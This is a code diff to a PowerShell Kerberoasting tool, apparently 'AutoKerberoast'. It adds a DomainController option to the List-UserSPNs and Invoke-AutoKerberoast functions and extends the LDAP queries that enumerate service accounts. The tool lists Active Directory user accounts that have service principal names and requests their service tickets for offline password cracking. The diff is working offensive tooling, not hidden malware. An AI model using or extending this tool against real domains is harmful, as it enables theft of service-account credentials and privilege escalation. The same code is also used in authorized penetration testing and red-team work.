@@ -43,6 +43,10 @@ function List-UserSPNs
   .PARAMETER GroupName
     This paremeter will only return SPNs that use users in a specific group, e.g. "Domain Admins"
 
+  .PARAMETER DomainController
+    This will redirect queries to a specific Domain Controller.  This is especially useful when environment doesn't use a DC for DNS resolutions.
+    NOTE: this will only return TGS Tickets from that DC's Domain, instead of the entire forest.
+
   .PARAMETER ViewAll
     Switch that displays ALL SPNs, even if they are protected by the same user.  
     Default is to only show 1 SPN per user account (e.g. if two MSSQL SPNs are registered to the user sqlAdmin, it will only request a ticket for the first service)
@@ -54,6 +58,7 @@ function List-UserSPNs
     PS C:\> List-UserSPNS
     PS C:\> List-UserSPNS -GroupName "Domain Admins"
     PS C:\> List-UserSPNS -Domain dev.testlab.local
+    PS C:\> List-UserSPNS -DomainController 172.20.200.100 
 #>
 
   [CmdletBinding()]
@@ -63,6 +68,9 @@ function List-UserSPNs
 
     [Parameter(Mandatory=$False)]
     [string]$GroupName = "",
+
+    [Parameter(Mandatory=$False)]
+    [string]$DomainController = "",
 
     [Parameter(Mandatory=$False)]
     [switch]$ViewAll,
@@ -75,10 +83,14 @@ function List-UserSPNs
 
   $GCs = @()
 
-  If ( $Domain ) 
+  if ( $DomainController ) 
+  {
+    $GCs += $DomainController
+  }
+  elseif ( $Domain )
   {
     $GCs += $Domain
-  }
+  }    
   else # find them
   { 
     # This code for identifying domains in current forest was Copied directly from Powerview's Get-ForestDomain Function, found at https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
@@ -126,14 +138,14 @@ function List-UserSPNs
   name                           {sqlengine}
   whenchanged                    {9/22/2014 6:45:21 AM}
   badpasswordtime                {0}
-  dscorepropagationdata          {4/4/2014 2:16:44 AM, 4/4/2014 12:58:27 AM, 4/4/2014 12:37:04 AM,...
+  dscorepropagationdata          {4/4/2014 2:16:44 AM, 4/4/2014 12:58:27 AM, 4/4/2014 12:37:04 AM,...}
   lastlogontimestamp             {130558419213902030}
   lastlogoff                     {0}
   objectclass                    {top, person, organizationalPerson, user}
   countrycode                    {0}
   cn                             {sqlengine}
   whencreated                    {4/4/2014 12:37:04 AM}
-  objectsid                      {1 5 0 0 0 0 0 5 21 0 0 0 191 250 179 30 180 59 104 26 248 205 17...
+  objectsid                      {1 5 0 0 0 0 0 5 21 0 0 0 191 250 179 30 180 59 104 26 248 205 17...}
   objectguid                     {101 165 206 61 61 201 88 69 132 246 108 227 231 47 109 102}
   objectcategory                 {CN=Person,CN=Schema,CN=Configuration,DC=medin,DC=local}
   usncreated                     {57551}
@@ -144,16 +156,17 @@ function List-UserSPNs
   ForEach ( $GC in $GCs ) 
   {
   	$searcher = New-Object System.DirectoryServices.DirectorySearcher
-  	$searcher.SearchRoot = "LDAP://" + $GC
+    $searcher.SearchRoot = "LDAP://" + $GC
   	$searcher.PageSize = 1000
   	$searcher.Filter = "(&(!objectClass=computer)(servicePrincipalName=*))"
-  	$searcher.PropertiesToLoad.Add("serviceprincipalname") | Out-Null
-  	$searcher.PropertiesToLoad.Add("name") | Out-Null
-  	$searcher.PropertiesToLoad.Add("userprincipalname") | Out-Null
+    $searcher.PropertiesToLoad.Add("serviceprincipalname") | Out-Null
+    $searcher.PropertiesToLoad.Add("name") | Out-Null
+    $searcher.PropertiesToLoad.Add("userprincipalname") | Out-Null
     $searcher.PropertiesToLoad.Add("memberof") | Out-Null
     $searcher.PropertiesToLoad.Add("distinguishedname") | Out-Null
-  	#$searcher.PropertiesToLoad.Add("displayname") | Out-Null
-  	#$searcher.PropertiesToLoad.Add("pwdlastset") | Out-Null
+    $searcher.PropertiesToLoad.Add("pwdlastset") | Out-Null
+    $searcher.PropertiesToLoad.Add("whencreated") | Out-Null
+    $searcher.PropertiesToLoad.Add("samaccountname") | Out-Null
 
   	$searcher.SearchScope = "Subtree"
   	$results = $searcher.FindAll()
@@ -182,11 +195,12 @@ function List-UserSPNs
           Select-Object -InputObject $result -Property `
           @{Name="SPN"; Expression={$spn.ToString()} }, `
           @{Name="Name";                 Expression={$result.Properties["name"][0].ToString()} }, `
+          @{Name="SamAccountName";       Expression={$result.Properties["samaccountname"][0].ToString()} }, `
           @{Name="UserPrincipalName";    Expression={$result.Properties["userprincipalname"][0].ToString()} }, `
           @{Name="DistinguishedName";    Expression={$distingName} }, `
-          @{Name="MemberOf";             Expression={$groups} } #, 
-          #@{Name="DisplayName";          Expression={$result.Properties["displayname"][0].ToString()} }, `            
-          #@{Name="PasswordLastSet";      Expression={[datetime]::fromFileTime($result.Properties["pwdlastset"][0])} }
+          @{Name="MemberOf";             Expression={$groups} }, `
+          @{Name="PasswordLastSet";      Expression={[datetime]::fromFileTime($result.Properties["pwdlastset"][0])} }, `
+          @{Name="whencreated";          Expression={$result.Properties["whencreated"][0].ToString()} } 
           
           if ( $Request )
           {
@@ -222,20 +236,29 @@ function Invoke-AutoKerberoast
     .PARAMETER SPN
         This paremeter will only request and process TGS ticket for single SPN.  Recommend running List-UserSPNs first to identify name of useful SPN.
 
+    .PARAMETER DomainController
+        This will redirect List-UserSPNs queries to a specific Domain Controller.  This is especially useful when environment doesn't use a DC for DNS resolutions.
+        NOTE: this will only return SPNs from that DC's Domain, instead of the entire forest.
+
+
     .EXAMPLE
-        PS C:\> List-UserSPNS
-        PS C:\> List-UserSPNS -GroupName "Domain Admins"
-        PS C:\> List-UserSPNS -Domain dev.testlab.local
-        PS C:\> List-UserSPNS -SPN MSSQLSvc/sqlBox.testlab.local:1433
+        PS C:\> Invoke-AutoKerberoast
+        PS C:\> Invoke-AutoKerberoast -GroupName "Domain Admins"
+        PS C:\> Invoke-AutoKerberoast -Domain dev.testlab.local
+        PS C:\> Invoke-AutoKerberoast -SPN MSSQLSvc/sqlBox.testlab.local:1433
+        PS C:\> Invoke-AutoKerberoast -DomainController 172.20.200.100 
 #>
 
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$False)] 
-        [string]$GroupName="",
+        [string]$GroupName = "",
 
         [Parameter(Mandatory=$False)]
-        [string]$Domain="",
+        [string]$Domain = "",
+
+        [Parameter(Mandatory=$False)]
+        [string]$DomainController = "",
 
         [Parameter(Mandatory=$False)]
         [string]$SPN
@@ -260,7 +283,7 @@ function Invoke-AutoKerberoast
     }
     else
     {
-        $SPNs = List-UserSPNs -Request -Group $GroupName -Domain $Domain | Select SPN, DistinguishedName
+        $SPNs = List-UserSPNs -Request -Group $GroupName -Domain $Domain -DomainController $DomainController | Select SPN, DistinguishedName
         if ( ! $SPNs )
         {
             write-output "Unable to obtain any user account SPNs"
